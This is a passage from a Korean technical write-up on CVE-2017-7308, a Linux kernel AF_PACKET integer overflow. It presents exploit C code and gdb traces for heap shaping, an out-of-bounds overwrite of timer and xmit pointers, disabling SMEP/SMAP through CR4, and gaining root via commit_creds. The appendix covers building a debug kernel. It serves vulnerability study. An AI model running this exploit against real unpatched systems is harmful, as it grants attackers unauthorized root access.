h.raw = pkc1->pkblk_start + 48 + (1u<<31) + (1u<<30) + 0x8000 - 48 - macoff + 2048 + 896 - 8;
h.raw = pkc1->pkblk_start + (1u<<31) + (1u<<30) + 0x8000 - macoff + 2048 + 896 - 8;

skb_copy_bits(skb, 0, h.raw + macoff, snaplen);
skb_copy_bits(skb, 0, pkc1->pkblk_start + (1u<<31) + (1u<<30) + 0x8000 - macoff + 2048 + 896 - 8 + macoff, snaplen);
skb_copy_bits(skb, 0, pkc1->pkblk_start + (1u<<31) + (1u<<30) + 0x8000 + 2048 + 896 - 8, snaplen);
```

<br>
최종적으로 skb_copy_bits에 전달되는, data 복사가 시작되는 지점을 나타내는 offset은 pkc1->pkblk_start + 0x8000  + 2048 + 896 - 8가 된다.

- pkblk_start : block의 시작지점

- 0x8000: block의 크기

- 2048: packet socket의 크기

- 896: timer_list 구조체 까지의 거리

- 8 : ???

<br>
두 번째 block이 반환되면 두 번째 block의 시작 지점에서 block 전체를 건너 뛰고, 첫 번째 packet socket을 뛰어넘어 두 번째 packet socket의 시작 지점까지 접근한 다음 timer_list 구조체까지 이동한 후 8을 뺀 지점이 최종적으로 data 가 쓰여지는 지점이 되며 아래 그림과 같다.

<a href="/assets/images/cve-2017-7308/shaping_heap_ex.png"><img src="/assets/images/cve-2017-7308/shaping_heap_ex.png" alt="shaping_heap_ex"></a>

<br>
private area의 크기 설정이 완료되면, packet socket를 생성하고 0x8000 크기의 block 2개를 연결한 후 loopback에 bind한다.

이제 oob_setup()을 통해 packet socket에 private area의 크기가 수정된 block이 설정되었다. 이제 block 바로 뒤에 packet socket을 위치시키기 위해 아래와 같이 32개의 packet socket을 생성한다. 생성되는 packet socket에는 0x1000 크기의 block 1개를 연결하고 tp_retire_blk_tov를 1000(1초)로 설정한다.

```c
int i;
for (i = 0; i < 32; i++)
{
	int timer = packet_sock_kmalloc();
	packet_sock_timer_schedule(timer, 1000);
}
```

<br>
이제 다음으로 아래와 같이 payload를 설정한다.

```c
char buffer[2048];
memset(&buffer[0], 0, sizeof(buffer));

struct timer_list *timer = (struct timer_list *)&buffer[8];
timer->function = func;	// NATIVE_WRITE_CR4
timer->data = arg;		// CR4_DESIRED_VALUE
timer->flags = 1;

oob_write(&buffer[0] + 2, sizeof(*timer) + 8 - 2);
```

<br>
timer_list 구조체를 선언하고, function과 data를 설정한다. function은 NATIVE_WRITE_CR4 주소로, data는 0x407f0ul로 설정한다. 이것은 SMAP/SMEP를 우회하기 위한 것으로 자세한 것은 이후에 다시 알아보도록 하자. flags가 0이면 타이머가 작동하지 않기 때문에 반드시 1로 설정하여야 한다. 이 때 전달되는 payload는 아래와 같다.

offset: pkc1->pkblk_start + 0x8000  + 2048 + 896 - 8
<br><a href="/assets/images/cve-2017-7308/payload.png"><img src="/assets/images/cve-2017-7308/payload.png" alt="payload"></a>

<br>
payload 설정이 끝난 후 oob_write()를 호출하는데 이 때 전달되는 offset이 좀 이해가 되지 않는다. 위에서 살펴본 것처럼 데이터를 쓰게 될 위치는 pkc1->pkblk_start + 0x8000  + 2048 + 896 - 8이며 결국 두 번째 block 옆의 두 번째 packet socket 내 timer 구조체의 위치 -8을 의미한다. 

timer_list 구조체 offset의 -8 지점에는 8바이트의 tov_in_jiffies 변수가 위치하고 있다. 하지만 위의 그림처럼 실제 전달되는 payload는 timer_list 구조체 앞에 6바이트 밖에 없다. 따라서 실제 timer_list 구조체의 offset과 2바이트만큼 차이가 생기는 것이다.
<a href="/assets/images/cve-2017-7308/payload_setting.png"><img src="/assets/images/cve-2017-7308/payload_setting.png" alt="payload_setting"></a>

<br>
왜 이렇게 설정하는지 도저히 알 수가 없어서 디버깅을 통해 해당 값이 변화되는 부분을 찾았는데 바로 prb_open_block() 함수이다.
<br>위에서 확인했듯이 exploit 코드에서 전달하는 private area의 크기는 0xc0008af6이다.
<br>tpacket_rcv() 함수와 prb_open_block() 함수에 차례로 breakpoint를 걸고 prb_open_block() 함수까지 진입한다.

```assembly
b *tpacket_rcv
b *prb_open_block
```

<br>
prb_open_block() 함수에 진입을 한 후, 아래와 같이 prb_open_block+68부분까지 진행한다.
<a href="/assets/images/cve-2017-7308/gdb_prb_open_block+68.png"><img src="/assets/images/cve-2017-7308/gdb_prb_open_block+68.png" alt="gdb_prb_open_block+68"></a>
<br>RAX 값을 보면 exploit에서 전달한 private area의 크기인 0x8af6 값이 있다.  


ni로 다음 인스트럭션까지 진행해보면, 7을 더함으로써 해당 값이 0x8afd로 증가한 것을 볼 수 있다.
<a href="/assets/images/cve-2017-7308/gdb_prb_open_block+71.png"><img src="/assets/images/cve-2017-7308/gdb_prb_open_block+71.png" alt="gdb_prb_open_block+71"></a>

<br>
다음 인스트럭션을 실행하면 0xfffffff8과의 AND 연산을 한 결과가 아래와 같이 RAX에 저장된다.
<a href="/assets/images/cve-2017-7308/gdb_prb_open_block+74.png"><img src="/assets/images/cve-2017-7308/gdb_prb_open_block+74.png" alt="gdb_prb_open_block+74"></a>

<br>
연산의 결과 값은 0x8af8로써 exploit에서 전달한 값인 0x8af6보다 2만큼 증가한 것을 알 수 있다. 이 부분의 소스는 아래와 같이 af_packet.c의 855라인이다.

```c
/* https://elixir.bootlin.com/linux/v4.8/source/net/packet/af_packet.c#L841 */
BLOCK_LEN(pbd1) = BLK_PLUS_PRIV(pkc1->blk_sizeof_priv);
```
<br>
BLK_PLUS_PRIV는 매크로로써 아래와 같이 정의되어 있으며 관련된 매크로 역시 아래에 정리했다.

```c
#define V3_ALIGNMENT	(8)
#define BLK_HDR_LEN	(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))

#define __ALIGN_KERNEL_MASK(x, mask)	(((x) + (mask)) & ~(mask))
#define __ALIGN_KERNEL(x, a)		__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)
#define ALIGN(x, a)			__ALIGN_KERNEL((x), (a))

#define BLK_PLUS_PRIV(sz_of_priv) \
	(BLK_HDR_LEN + ALIGN((sz_of_priv), V3_ALIGNMENT))
```

<br>
위 계산식의 계산 과정은 아래와 같다.

```c
BLK_PLUS_PRIV(pkc1->blk_sizeof_priv)
= (ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT) + ALIGN((sz_of_priv), V3_ALIGNMENT))
= (ALIGN(48), 8) + ALIGN((sz_of_priv), 8))
= (__ALIGN_KERNEL(48), 8) + __ALIGN_KERNEL((0x8af6), 8))
= (__ALIGN_KERNEL_MASK(48), 7) + __ALIGN_KERNEL_MASK((0x8af6), 7))
= ((48 + 7) & ~7) + ((0x8af6 + 7) & ~7)
= (55 & ~7) + (35581 & ~7) (7은 binary로 111이므로 ~7은 000이 된다)
= (110111 & 000) + (1000101011111101 & 000)
= 110000 + 1000101011111000
= 48 + 35576
= 35624
= 0x8b28
```


<br>
아래는 해당 결과 값이 저장된 RAX의 값이다. 0x8b28이 저장되어 있다.
<a href="/assets/images/cve-2017-7308/gdb_prb_open_block+77.png"><img src="/assets/images/cve-2017-7308/gdb_prb_open_block+77.png" alt="gdb_prb_open_block+77"></a>


<br>
위에서 아직 실행되지 않은 prb_open_block+77을 보면, 계산된 결과 값을 rsi+0x14에 저장하는 것이 보인다. 이 위치는 아래 매크로와 같이 blk_len 변수에 저장된다.

```
#define BLOCK_LEN(x)		((x)->hdr.bh1.blk_len)
```

<a href="/assets/images/cve-2017-7308/gdb_prb_open_block_blk_len.png"><img src="/assets/images/cve-2017-7308/gdb_prb_open_block_blk_len.png" alt="gdb_prb_open_block_blk_len"></a>

<br>
조금 더 진행하면 문제의 nxt_offset을 계산하는 부분이 나오는데, 소스는 아래와 같다.

```c
pkc1->nxt_offset = pkc1->pkblk_start + BLK_PLUS_PRIV(pkc1->blk_sizeof_priv);
```


<br>
바로 위에서 계산했던 BLK_PLUS_PRIV(pkc1->blk_sizeof_priv)의 결과 값이 pkc1->pkblk_start 값과 더해져서 nxt_offset이 되는데, BLK_PLUS_PRIV 매크로의 영향으로 실제 private area 값보다 2가 증가한 값이 nxt_offset으로 저장되는 것이다.

아래는 해당 결과의 값이 저장된 모습이다.
<a href="/assets/images/cve-2017-7308/gdb_prb_open_block+127.png"><img src="/assets/images/cve-2017-7308/gdb_prb_open_block+127.png" alt="gdb_prb_open_block+127"></a>

<br>
따라서 payload 구성 시 계산된 offset보다 2가 작은 값을 보내야만 정확한 위치에 payload를 쓸 수 있게 된다. 아래와 같이 검증을 해보자.
<br>
skb_copy_bits에 breakpoint를 걸면 아래와 같이 rdx 레지스터의 값을 통해 h.raw + macoff 값을 알 수 있다. 이 값은 0xffff880039bf837a이다.<br>
<a href="/assets/images/cve-2017-7308/gdb_payload_1.png"><img src="/assets/images/cve-2017-7308/gdb_payload_1.png" alt="gdb_payload_1"></a>

<br>
이 값은 두 번째 packet_sock 구조체에서 retire_blk_timer 구조체의 위치로부터 -8 지점이므로, 해당 구조체의 offset 값인 0x380(896)을 뺀 후 6바이트를 더한 지점을 살펴보자.

```assembly
pwndbg> p *(struct packet_sock *)(0xffff880039460b7a-0x380+0x6)
```

정확한 지점에 data가 복사되어 있는 것을 확인할 수 있다.
<a href="/assets/images/cve-2017-7308/gdb_retire_blk_timer.png"><img src="/assets/images/cve-2017-7308/gdb_retire_blk_timer.png" alt="gdb_retire_blk_timer"></a>

<br>
이제 payload가 설정되었으니 아래와 같이 oob_write()를 실행하는데, 해당 함수는 raw socket을 생성하여 loopback으로 payload를 전송하는 역할을 한다.

```c
void packet_socket_send(int s, char *buffer, int size) 
{
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;

	if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) 
	{
		perror("[-] sendto(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

void loopback_send(char *buffer, int size)
{
	int s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (s == -1)
	{
		perror("[-] socket(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}

	packet_socket_send(s, buffer, size);
}

void oob_write(char *buffer, int size)
{
	loopback_send(buffer, size);
}
```

<br>
loopback에 bind되어 있는 packet socket은 수신된 위의 packet을 parsing하고 저장하는 과정에서, 두 번째 block의 두 번째 뒤에 위치하는 packet socket의  retire_blk_timer 구조체를 덮어쓰게 된다. 해당 packet socket은 타이머가 설정되어 있으므로, 1초 후에 retire_blk_timer->func가 실행된다. 따라서 NATIVE_WRITE_CR4(0x407f0)이 실행된다.


아래는 CR4 레지스터의 각 비트의 값을 나타낸 그림이며, 20번, 21번 비트가 각각 SMEP, SMAP를 나타낸다.
<a href="/assets/images/cve-2017-7308/cr4.png"><img src="/assets/images/cve-2017-7308/cr4.png" alt="cr4"></a>

<br>
현재 설정되어 있는 CR4의 값은 아래와 같이 GDB를 통해 확인할 수 있다. 이 값은 사용중인 cpu에 따라 다를 수 있는데, qemu에 디버거를 붙인 다음 info registers 명령을 통해 확인한 cr4 레지스터의 값은 아래와 같이 0x3406F0이다.
<a href="/assets/images/cve-2017-7308/gdb_register_info.png"><img src="/assets/images/cve-2017-7308/gdb_register_info.png" alt="gdb_register_info"></a>

<br>
이 값을 이진수로 표현하면  아래와 같으며, 20번 21번째 비트를 비활성 시키면 0x407f0이 된다.

0x3406F0 : **11**01000000011011110000<br>
0x0407f0 :  **00**01000000011111110000

지금부터는 kernel mode에서 user mode의 코드를 실행할 수 있게된다.


### 7. oob_id_match_execute

oob_id_match_execute() 함수 호출 시 `commit_creds(prepare_kernel_cred(0))`를 호출하기 위한 함수 포인터가 전달된다.

```c
#define XMIT_OFFSET	1304

void get_root_payload(void) {
	((_commit_creds)(KERNEL_BASE + COMMIT_CREDS))(
		((_prepare_kernel_cred)(KERNEL_BASE + PREPARE_KERNEL_CRED))(0)
	);
}

void packet_sock_id_match_trigger(int s) {
	char buffer[16];
	packet_socket_send(s, &buffer[0], sizeof(buffer));
}

void oob_id_match_execute(void *func) {
	int s = oob_setup(2048 + XMIT_OFFSET - 64);

	int ps[32];

	int i;
	for (i = 0; i < 32; i++)
		ps[i] = packet_sock_kmalloc();

	char buffer[2048];
	memset(&buffer[0], 0, 2048);

	void **xmit = (void **)&buffer[64];
	*xmit = func;

	oob_write((char *)&buffer[0] + 2, sizeof(*xmit) + 64 - 2);

	for (i = 0; i < 32; i++)
		packet_sock_id_match_trigger(ps[i]);
}

oob_id_match_execute((void *)&get_root_payload);
```

<br>
먼저 이전과 동일하게 oob_setup()에 xmit 함수 포인터의 offset을 파라미터로 전달하며 호출한다. xmit의 위치는 packet_sock 구조체로부터 1304만큼 떨어져 있다. 64를 빼는 이유는 전과 동일하게 해당 값이 payload로 사용된 buffer의 64번째 위치에 존재하고 있기 때문이다.

oob_setup()으로 block을 정렬하고 난 후 바로 뒤에 packet socket32개를 붙이고, payload를 설정한 후 oob_write()을 호출하여 xmit를 덮어쓴다. payload는 역시 해당 위치로부터 2를 뺀 값을 보낸다.

앞에서는 timer를 이용해 조작된 함수가 호출되도록 하였지만, xmit의 경우 패킷을 보낼 때마다 함수가 호출된다. tpacket_snd() 함수를  살펴보면 2741라인에서 해당 함수가 호출되는 것을 볼 수 있다.

```c
/* https://elixir.bootlin.com/linux/v4.8/source/net/packet/af_packet.c#L604 */

static int tpacket_snd(struct packet_sock *po, struct msghdr *msg)
{
    ...
    ph = packet_current_frame(po, &po->tx_ring,
					  TP_STATUS_SEND_REQUEST);
    ...
    tp_len = tpacket_parse_header(po, ph, size_max, &data);
    ...
    skb = sock_alloc_send_skb(&po->sk,
				hlen + tlen + sizeof(struct sockaddr_ll) +
				(copylen - dev->hard_header_len),
				!need_wait, &err);
    ...
    tp_len = tpacket_fill_skb(po, skb, ph, dev, data, tp_len, proto,
					  addr, hlen, copylen, &sockc);
    ...
    packet_pick_tx_queue(dev, skb);
    ...
    packet_inc_pending(&po->tx_ring);
    ...
    err = po->xmit(skb);
    ...
}
```
<br>
tpacket_snd() 함수 자체는 tpacket_rcv() 함수와 꽤 유사한 편이다. 

packet_current_frame() 함수를 호출하여 tx_ring으로부터 현재의 frame를 찾아 header를 파싱하고 길이를 구한 다음, 버퍼를 할당하고 채운다. 작업이 완료된 버퍼를 넣을 적절한 queue를 선택하고, reference count를 증가시킨다. 그리고 나면 비로소 packet socket의 xmit 함수를 호출하며 파라미터로 sk_buff를 전달하는데, 원래 이 값은 packet_create() 시에 설정되는 dev_queue_xmit() 함수이며, 파라미터로 전달된 sk_buff를 앞에서 선택한 queue에 넣는 작업을 한다.

xmit는 현재 commit_creds(prepare_kernel_cred(0)) 함수의 주소로 바뀌어져 있고, kernel 레벨에서 동작하지만, SMEP/SMAP가 꺼진 상태이므로 user space에 존재하는 commit_creds() 함수의 주소를 실행할 수 있게 된다.

linux는 process를 관리하기 위해 `task_struct` 구조체를 사용한다. 그리고 이 구조체에는 해당 task의 credentials를 관리하기 위해 cred 구조체를 사용한다. `prepare_kernel_cred()` 함수에 0을 전달하여 호출하게 되면 새로운 cred 구조체를 초기화 하여 반환한다.

```c
/* https://elixir.bootlin.com/linux/v4.8/source/include/linux/cred.h#L118 */
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
};
```

<br>
`commit_creds()` 함수는 현재 프로세스의 cred를 파라미터로 전달된 cred 구조체로 변경하는 작업을 한다. 위에서 초기화 된, 즉 uid, gid 등이 0으로 설정된 cred 구조체를 전달했으므로 현재 프로세스가 root 권한을 가지게 된다. kernel 레벨에서 실행되므로 이상 없이 root 권한을 획득할 수 있게 된다.



## Appendix


### 1. kernel 패치하기

ubuntu kernel을 기반으로 특정 버전으로 패치를 할 필요가 있을 때 아래와 같이 패치하면 된다.<br>
먼저 해당 취약점을 가지고 있는 kernel 소스의 위치를 찾는다. 여기서는 4.8.0-41 버전을 기준으로 이야기 한다.<br>
해당 kernel 버전 소스의 위치는 아래와 같다.<br>
https://launchpad.net/ubuntu/+source/linux-hwe/4.8.0-41.44~16.04.1


위 페이지의 하단을 보면 3개의 파일이 올라와 있는 것을 볼 수 있다.  아래처럼 source라는 디렉토리를 만들고 모든 파일을 다운로드 받아서 apt  명령으로 패치를 적용할 수 있다.

```bash
[host]
cd ~/lke
mkdir source
cd source
wget https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/linux-hwe/4.8.0-41.44~16.04.1/linux-hwe_4.8.0.orig.tar.gz
wget https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/linux-hwe/4.8.0-41.44~16.04.1/linux-hwe_4.8.0-41.44~16.04.1.diff.gz
wget https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/linux-hwe/4.8.0-41.44~16.04.1/linux-hwe_4.8.0-41.44~16.04.1.dsc
sudo apt install dpkg-source
dpkg-source -x *.dsc
```



### 2. kernel 빌드하기

ubuntu 20.04에서 kernel 컴파일을 시도하면 undefined reference to `____ilog2_NaN' 라는 에러를 만나게 되는데,<br>
https://unix.stackexchange.com/questions/461314/qemu-cannot-boot-locally-built-linux-kernel-anymore 에 따르면,<br>
binutils가 2.31 이상일 경우에 발생하는 문제로 보인다.<br>
따라서 kernel compile을 위해 virtualbox를 이용하거나 낮은 버전의 ubuntu를 이용해야 한다.

virtualbox 또는 낮은 버전의 ubuntu가 준비되었다면 kernel 컴파일을 위해 필요한 패키지를 설치해야 하며, 대충 아래와 같은 패키지가 필요하다.

```bash
sudo apt install binutils build-essential kernel-package git wget curl libncurses5 libncurses5-dev bin86 libssl-dev bison flex libelf-dev
```

<br>
ubuntu kernel의 소스를 다운받는다. 만약 필요 시에는 patch를 먼저 진행하도록 한다.
kernel 컴파일을 위한 명령어는 아래와 같다.

make defconfig

make ARCH=x86_64 menuconfig

-> Kernel hacking [Click]

  -> Compile-time checks and compiler options [Click]

​    -> Compile the kernel with debug info [Check]

​    	-> Provide GDB scripts for kernel debugging



nproc 명령어로 cpu 수를 확인하고 make 옵션에 사용한다.

```bash
make -j $(nproc)
```



컴파일이 성공적으로 완료되면 현재 디렉토리에 vmlinux 바이너리가 생성되어 있을 것이다.





## Reference

[Exploiting the Linux kernel via packet sockets](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html)

[CVE-2017-7308 분석 블로그 번역](https://procdiaru.tistory.com/91)

[CVE-2017-7308 FLOW 분석](https://procdiaru.tistory.com/93)

[Privilege Escalation CVE-2017-7308](http://www.cs.ucr.edu/~asong011/cve-2017-7308/CVE-2017-7308-AngdaSong-QiwenLyu.pdf)

[af_packet.c - net/packet/af_packet.c - Linux source code (v4.8) - Bootlin](https://elixir.bootlin.com/linux/v4.8/source/net/packet/af_packet.c)

[Prepare the environment for developing Linux kernel with qemu](https://medium.com/@daeseok.youn/prepare-the-environment-for-developing-linux-kernel-with-qemu-c55e37ba8ade)

[Linux Kernel Debugging with QEMU](https://applemasterz17.tistory.com/242)

[setup_ubuntu-host_qemu-vm_x86-64-kernel.md](https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md)

[[Linux Kernel] Buddy Memory Allocator 란?](https://wogh8732.tistory.com/402)

[[Linux Kernel] Slab Memory Allocator 란?](https://wogh8732.tistory.com/418)

[CVE-2017-7308 Linux Kernel packet_set_ring integer symbol error vulnerability analysis and exploitation (local privilege escalation)](http://repwn.com/archives/27/)

[Linux 3.9.11 분석 (x86_64)](http://www.iamroot.org/ldocs/linux.html#sec-118-1)

[How SKBs work](http://vger.kernel.org/~davem/skb_data.html)

[What is SKB in Linux kernel? What are SKB operations? Memory Representation of SKB? How to send packet out using skb operations?](http://amsekharkernel.blogspot.com/2014/08/what-is-skb-in-linux-kernel-what-are.html)

[Linux Network Architecture](https://slideplayer.com/slide/9179229/)

[BuildYourOwnKernel](https://wiki.ubuntu.com/Kernel/BuildYourOwnKernel)

[[Linux Kernel의 skbuff(Socket buffer descriptors)에 대하여](https://www.minzkn.com/moniwiki/wiki.php/skbuff)](https://www.minzkn.com/moniwiki/wiki.php/skbuff)


